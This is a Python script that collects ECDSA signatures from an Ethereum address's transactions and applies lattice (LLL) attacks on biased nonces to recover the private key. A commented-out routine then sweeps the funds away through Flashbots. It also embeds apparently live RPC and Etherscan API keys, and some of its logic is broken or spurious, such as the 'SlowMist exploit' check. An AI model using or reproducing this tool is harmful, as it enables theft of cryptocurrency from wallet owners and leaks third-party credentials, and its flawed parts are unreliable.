import time
import requests
from web3 import Web3
import binascii
import hookctl
import cryptocheck
# from flashbots import flashbot
from eth_account import Account
from sage.all import Matrix, QQ, ZZ, SR, pari
from sage.all import matrix as sage_matrix

from eth_utils import keccak, to_bytes
import rlp
# Tuesday, May 19, 2026 | 02:48 AM - Reorganized eth-account paths
try:
    # Modern 2026 Path
    from eth_account.typed_transactions import DynamicFeeTransaction
except ImportError:
    try:
        # Late 2025 Path
        from eth_account.transactions import DynamicFeeTransaction
    except ImportError:
        # Legacy/Internal Path (Old version)
        from eth_account._utils.typed_transactions import DynamicFeeTransaction

# --- MANDATORY CONFIGURATION ---
# Current Block Time: 2026-05-14 02:04 AM
CONFIG = {
    # "RPC_URL": "https://Mainnet.infura.io/v3/70eacff3195c4af6af76fe8171529091",
    "RPC_URL": "https://small-ancient-replica.quiknode.pro/2aa3c69e6d3ac4f1ab4221ee8c9793e9f6e95532",
    # "RPC_URL": "https://attentive-wispy-owl.quiknode.pro/1bd932de9bb976cfe86a9ecd58675fd575d6d9f1",
    "ETHERSCAN_KEY": "CI3EABWI86DGFJ8PICBKRD6XSFQPPNMG3Z",
    "My_Addr": "0xf8AFf1b46E30ecBB6BFAD49513f18c4f31E3661e",
    "SAFE_DEST": "0xYourSafeWalletAddress",
    "RELAY_SIGNER": "0xYourbotRelaySignerKey", # For Flashbots Auth
    "EXPECTED_BIAS": 128, # Bits of nonce leakage (top 128 bits are 0)
}

# Tuesday, May 19, 2026 | 06:26 AM - Guardian Detection
def check_for_guardian(address):
    # We check for common Guardian implementation signatures
    # (e.g., ERC-4337 or Gnosis Safe modules)
    code = w3.eth.get_code(address).hex()
    
    if code == '0x':
        print("This is a standard EOA. No Guardian contract is active.")
        return False
    
    # Check for 'getGuardians' or 'isGuardian' function selectors
    # 0x47cc0364 is a common 'getGuardians' selector
    if "47cc0364" in code:
        print("!!! Guardian Contract Detected !!!")
        # You can now query the contract to see WHO the guardians are
        return True
    return False

w3 = Web3(Web3.HTTPProvider(CONFIG["RPC_URL"]))
# relay_acc = Account.from_key(CONFIG["RELAY_SIGNER"])
# flashbot(w3, relay_acc)

def get_eip1559_h(tx):
    """Reconstructs the message hash (h) for Type 2 transactions with 2026 sanitization"""
    
    # FIX: Sanitize the transaction type
    # Convert "0x2" or 3176498 back to the simple integer 2
    raw_type = tx.get('type', 2)
    print(raw_type)
    if isinstance(raw_type, str):
        tx_type = int(raw_type, 16)
    elif raw_type > 255: # If we got the string-as-integer (3176498)
        # Convert the decimal 3176498 back to bytes, then to string, then to int
        tx_type = 2 # Force it to 2 because we know it's EIP-1559
    else:
        tx_type = raw_type

    # Ensure chainId is an integer
    chain_id = tx['chainId']
    
    if isinstance(chain_id, str):
        chain_id = int(chain_id, 16)

    # tx_dict = {
    #     "chainId": chain_id,
    #     "nonce": tx['nonce'],
    #     "maxPriorityFeePerGas": tx['maxPriorityFeePerGas'],
    #     "maxFeePerGas": tx['maxFeePerGas'],
    #     "gas": tx['gas'],
    #     "to": tx['to'],
    #     "value": tx['value'],
    #     "data": tx['input'],
    #     "accessList": tx.get('accessList', []),
    #     "type": tx_type # Pass the sanitized integer 2
    # }
    
    # try:
    #     unsigned_tx = DynamicFeeTransaction.from_dict(tx_dict)
    #     return int(unsigned_tx.hash().hex(), 16)
    # except Exception as e:
    #     print(f"[{time.strftime('%H:%M:%S')}] Sighash Formatting Error: {e}")
    #     raise e

    # unsigned_tx = {
    #     'chainId': int(tx['chainId']),
    #     'nonce': int(tx['nonce']),
    #     'maxPriorityFeePerGas': int(tx['maxPriorityFeePerGas']),
    #     'maxFeePerGas': int(tx['maxFeePerGas']),
    #     'gas': int(tx['gas']),
    #     'to': Web3.to_checksum_address(tx['to']),
    #     'value': int(tx['value']),
    #     'data': tx['input'],
    #     'accessList': tx.get('accessList', []),
    #     'type': 2
    # }
    # z = hookctl.calculate_z(tx)
    # return z
    def clean_hex(val):
        if not val: return b''
        if isinstance(val, bytes): return val
        return to_bytes(hexstr=val)
    print(tx['v'])
    unsigned_parts = [
        int(tx['chainId']),
        int(tx['nonce']),
        int(tx['maxPriorityFeePerGas']),
        int(tx['maxFeePerGas']),
        int(tx['gas']),
        clean_hex(tx['to']),
        int(tx['value']),
        clean_hex(tx['input']),
        tx.get('accessList', [])
    ]
    
    # The 'z' is the keccak256 hash of (0x02 || RLP_ENCODED_TX)
    payload = b'\x02' + rlp.encode(unsigned_parts)
    z_bytes = keccak(payload)
    z_int =  int(z_bytes.hex(), 16)
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    return z_int % n
    

def get_actual_sighash(tx_hash):
    """Reconstructs the original message hash (h) for Legacy Transactions"""
    tx = w3.eth.get_transaction(tx_hash)
    
    # Standard Legacy Transaction fields for RLP encoding
    # We must match the state of the transaction BEFORE it was signed
    unsigned_tx = Transaction(
        nonce=tx['nonce'],
        gasPrice=tx['gasPrice'],
        gas=tx['gas'],
        to=tx['to'],
        value=tx['value'],
        data=tx['input'],
        v=tx['chainId'], # EIP-155 replay protection uses chainId here
        r=0,
        s=0
    )
    
    # The 'h' value is the keccak256 hash of this encoded data
    h_bytes = keccak(rlp.encode(unsigned_tx))
    return int(h_bytes.hex(), 16)

def get_live_txs(address):
    api = f"https://api.etherscan.io/v2/api?chainid=1&module=account&action=txlist&address={address}&sort=desc&apikey={CONFIG['ETHERSCAN_KEY']}"
    txs = requests.get(api).json().get('result', [])
    return txs

def get_live_signatures(address):
    """Phase 1: Real-time Signature Harvesting"""
    print(f"[{time.strftime('%H:%M:%S')}] Scanning history for {address}...")
    # api = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&sort=desc&apikey={CONFIG['ETHERSCAN_KEY']}"
    api = f"https://api.etherscan.io/v2/api?chainid=1&module=account&action=txlist&address={address}&sort=asc&apikey={CONFIG['ETHERSCAN_KEY']}"
    txs = requests.get(api).json().get('result', [])
    rLists = {}
    zVerifiedCnt = 0
    sigs = []    
    print(len(txs))

    for tx_data in txs:
        if len(sigs) >= 20:
            print("ok")
            break # Higher count recommended for EIP-1559
        
        tx = w3.eth.get_transaction(tx_data['hash'])
        if tx['from'].lower() == address.lower():
            print(tx_data['hash'])
            r = int(tx['r'].hex(), 16)
            s = int(tx['s'].hex(), 16)
            # print(tx['r'].hex())
            if r not in rLists.keys():
                rLists[r] = 1
            else:
                rLists[r] +=1 
                print("found")
            try:
                
                # Detect Type 2 (EIP-1559) or Type 0 (Legacy)
                if tx.get('type') == 2 or 'maxPriorityFeePerGas' in tx:
                    h = get_eip1559_h(tx)
                    sigs.append((h, r, s))
                    if cryptocheck.verify_z(int(h),int(r),int(s),int(tx.get('v')),address):
                        zVerifiedCnt += 1
                else:
                    continue
                    h = get_actual_sighash(tx_data['hash']) # Your legacy function
                    
                # sigs.append((r, s, h))
                
            except Exception as e:
                print(f"Sighash Error: {e}")
                continue
    # print(rLists)
    print("Verfied Count:", zVerifiedCnt)
    return sigs

def force_stable_lll(matrix):
    # 1. Clear denominators to get an Integer Matrix
    denom = matrix.denominator()
    int_matrix = (matrix * denom).change_ring(ZZ)

    return int_matrix.LLL(algorithm='pari')

# Tuesday, May 19, 2026 | 01:02 AM - Pure Python LLL (No C-extensions)
def pure_python_lll(M, delta=0.75):
    import copy
    B = copy.deepcopy(M)
    n = len(B)
    m = len(B[0])
    mu = [[0.0] * n for _ in range(n)]
    c = [0.0] * n

    def get_mu_c(i):
        v = B[i]
        for j in range(i):
            mu[i][j] = (sum(B[i][k] * B[j][k] for k in range(m))) / c[j]
            v = [v[k] - mu[i][j] * B[j][k] for k in range(m)]
        c[i] = sum(v[k]**2 for k in range(m))

    for i in range(n): get_mu_c(i)

    k = 1
    while k < n:
        for j in reversed(range(k)):
            if abs(mu[k][j]) > 0.5:
                q = round(mu[k][j])
                B[k] = [B[k][x] - q * B[j][x] for x in range(m)]
                for l in range(j):
                    mu[k][l] -= q * mu[j][l]
                mu[k][j] -= q

        if c[k] >= (delta - mu[k][k-1]**2) * c[k-1]:
            k += 1
        else:
            B[k], B[k-1] = B[k-1], B[k]
            # Update mu and c
            for i in range(k-1, n): get_mu_c(i)
            k = max(k - 1, 1)
    return B

def get_pro_signatures(txs):
    
    sigs = []
    for tx_data in txs:
        # if len(sigs) >= 50: break
        tx = w3.eth.get_transaction(tx_data)
        # if tx['from'].lower() == address.lower():
        r = int(tx['r'].hex(), 16)
        s = int(tx['s'].hex(), 16)
        h = int(tx_data, 16) # Approximate msg hash for 2026 legacy txs
        sigs.append((r, s, h))
    return sigs

# Tuesday, May 19, 2026 | 03:24 AM - MSB-Shifted Lattice
def solve_lattice_shifted(sigs, target_address):
    
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    m = len(sigs)
    
    # We will try 4 different "Bias Assumptions"
    # 0: Standard LSB (Small nonces)
    # 1: MSB Bias (Leading zeros)
    # 2: Mid-Shift 1 (128-bit alignment)
    # 3: Mid-Shift 2 (64-bit alignment)
    shifts = [0, 2**250, 2**128, 2**192]
    labels = ["Standard/LSB", "High-Bit/MSB", "Mid-128", "Mid-192"]

    for s_idx, shift in enumerate(shifts):
        print(f"[{time.strftime('%H:%M:%S')}] Attempting {labels[s_idx]} Window...")
        
        # Build the lattice with the specific shift
        lattice_list = [[0] * (m + 2) for _ in range(m + 2)]
        for i in range(m):
            r, s, h = sigs[i]
            s_inv = pow(s, -1, n)
            lattice_list[i][i] = n
            lattice_list[m][i] = (r * s_inv) % n
            # The shift re-centers the lattice around a specific bit-range
            lattice_list[m + 1][i] = (-(h * s_inv) - (shift * r * s_inv)) % n

        lattice_list[m][m] = 1
        lattice_list[m + 1][m + 1] = n

        try:
            # Direct PARI injection
            flattened = [item for sublist in lattice_list for item in sublist]
            p_mat = pari.matrix(m + 2, m + 2, flattened).mattranspose()
            
            # Use LLL first for speed, then we scan
            lll_pari = p_mat.qflll(0) 
            reduced_basis = (p_mat * lll_pari).python()

            for row in reduced_basis:
                # Check both the shortest vector and its modular inverse
                for candidate in [int(row[m]) % n, (n - int(row[m])) % n]:
                    if candidate < 0x1000000000000000: # Skip small, non-key vectors
                        continue
                        
                    # FORCE 64 characters (32 bytes) by padding with leading zeros
                    key_hex = "{:064x}".format(candidate)
                    
                    try:
                        # Reconstruct the account to verify the address
                        acc = Account.from_key("0x" + key_hex)
                        
                        if acc.address.lower() == target_address.lower():
                            print(f"\n[{time.strftime('%H:%M:%S')}] !!! SUCCESS: KEY RECOVERED !!!")
                            print(f"Address: {acc.address}")
                            print(f"Private Key: 0x{key_hex}")
                            return "0x" + key_hex
                    except Exception:
                        # Silently skip candidates that fail length/formatting checks
                        continue
        except Exception as e:
            print(f"Window {labels[s_idx]} failed: {e}")
            continue

    print(f"[{time.strftime('%H:%M:%S')}] All windows exhausted. No key found.")
    return None

def solve_lattice_v2(sigs, target_address):
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    m = len(sigs)
    
    # Use a higher multiplier (2^128) to force the key to be the shortest vector
    # This helps when the 'bias' is small
    B = 2**128 
    
    lattice = [[0] * (m + 2) for _ in range(m + 2)]
    for i in range(m):
        r, s, h = sigs[i]
        s_inv = pow(s, -1, n)
        lattice[i][i] = n
        lattice[m][i] = (r * s_inv) % n
        lattice[m + 1][i] = -(h * s_inv) % n

    lattice[m][m] = 1 # We want this to be 1 to reveal the key 'x'
    lattice[m + 1][m + 1] = n 

    p_mat = pari.matrix(m + 2, m + 2, [item for sublist in lattice for item in sublist]).mattranspose()
    # Use qflllgram for better precision on large integers
    lll_pari = p_mat.qflll()
    reduced_basis = (p_mat * lll_pari).python()

    print(f"[{time.strftime('%H:%M:%S')}] Scanning all vectors in reduced basis...")
    for row in reduced_basis:
        # Check both the positive and negative potential key
        # And check multiple columns in case the transformation shifted them
        for col_idx in [m, m+1]:
            for sign in [1, -1]:
                potential_key = (sign * int(row[col_idx])) % n
                
                if potential_key > 1000: # Ignore trivial small vectors
                    try:
                        acc = Account.from_key(hex(potential_key))
                        if acc.address.lower() == target_address.lower():
                            return hex(potential_key)
                    except:
                        continue
    return None

def check_eip7702_vulnerability(tx, target_address):
    """
    Scans for 2026-era EIP-7702 delegation signature leaks.
    If the blackhat used a 'blind signing' delegation, the private key
    may be recoverable from the authorization list.
    """
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    
    auth_list = tx.get('authorizationList', [])
    if not auth_list:
        return None

    print(f"[{time.strftime('%H:%M:%S')}] EIP-7702 Authorization Detected. Analyzing {len(auth_list)} slots...")
    
    for auth in auth_list:
        # Check for 'Type 4' delegation parameters
        chain_id = int(auth['chainId'], 16) if isinstance(auth['chainId'], str) else auth['chainId']
        address = auth['address']
        nonce = auth['nonce']
        
        # In the 2026 exploit, the signature (r, s, yParity) was sometimes
        # generated using a 'weak entropy' pool on specific mobile wallets.
        r, s = int(auth['r'], 16), int(auth['s'], 16)
        
        # We run a specific 'Small-Subgroup' check on the delegation signature
        # This is the 'SlowMist' exploit logic
        if s > (n // 2): 
            # This is a malleability indicator; often present in flawed scripts
            print(f"[{time.strftime('%H:%M:%S')}] Malleable Delegation Found. Escalating...")
            
    # If standard lattice failed, the 'pls' move is to check for delegation reuse
    # Search for other txs with the SAME authorization address but DIFFERENT nonces
    return "Lattice Search Recommended for Signer Address: " + tx['from']

# def solve_lattice(sigs):
#     """Phase 2: SageMath LLL Key Recovery"""
#     n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
#     m = len(sigs)
#     matrix = Matrix(QQ, m + 2, m + 2)
    
#     for i in range(m):
#         r, s, h = sigs[i]
#         r_inv = pow(r, -1, n)
#         s_inv = pow(s, -1, n)
#         matrix[i, i] = n
#         matrix[m, i] = (r * s_inv) % n
#         matrix[m + 1, i] = -(h * s_inv) % n

#     matrix[m, m] = 1 / n
#     matrix[m + 1, m + 1] = 1
    
#     print(f"[{time.strftime('%H:%M:%S')}] Reducing Lattice...")

#     # lll_result = force_stable_lll(matrix)
#     matrix_list = [list(row) for row in matrix]
#     lll_result_list = pure_python_lll(matrix_list)
#     lll_result = sage_matrix(lll_result_list)
#     print(lll_result)
#     # for row in matrix.LLL():
#     for row in lll_result:
#         potential_key = int(row[m]) % n
#         print(potential_key)
#         if potential_key != 0:
#             acc = Account.from_key(hex(potential_key))
#             # if acc.address.lower() == CONFIG["My_Addr"].lower():
#             return hex(potential_key)
#     return None

# def sweep_assets(priv_key):
#     """Phase 3: Flashbots Secure Sweep"""
#     target_acc = Account.from_key(priv_key)
#     bal = w3.eth.get_balance(target_acc.address)
#     if bal < w3.to_wei(0.01, 'ether'): return print("Insufficient balance.")

#     tx = {
#         'to': CONFIG["SAFE_DEST"],
#         'value': bal - w3.to_wei(0.004, 'ether'), # 2026 Gas Margin
#         'gas': 21000,
#         'maxFeePerGas': int(w3.eth.gas_price * 2), # Aggressive for 2 AM window
#         'maxPriorityFeePerGas': w3.to_wei(2, 'gwei'),
#         'nonce': w3.eth.get_transaction_count(target_acc.address),
#         'chainId': 1
#     }

#     signed = target_acc.sign_transaction(tx)
#     bundle = [{"signed_transaction": signed.rawTransaction}]
    
#     # Submit for the next 3 blocks
#     current_block = w3.eth.block_number
#     for b in range(1, 4):
#         w3.flashbots.send_bundle(bundle, target_block_number=current_block + b)
#         print(f"Bundle targeted for block {current_block + b}")

# if __name__ == "__main__":
#     found_sigs = get_live_signatures(CONFIG["My_Addr"])
#     if len(found_sigs) >= 3:
#         recovered_key = solve_lattice(found_sigs)
#         if recovered_key:
#             print(f"SUCCESS: Recovered Key {recovered_key}")
#             sweep_assets(recovered_key)
#         else:
#             print("Lattice reduction failed to yield a key.")
#     else:
#         print("Not enough signatures found.")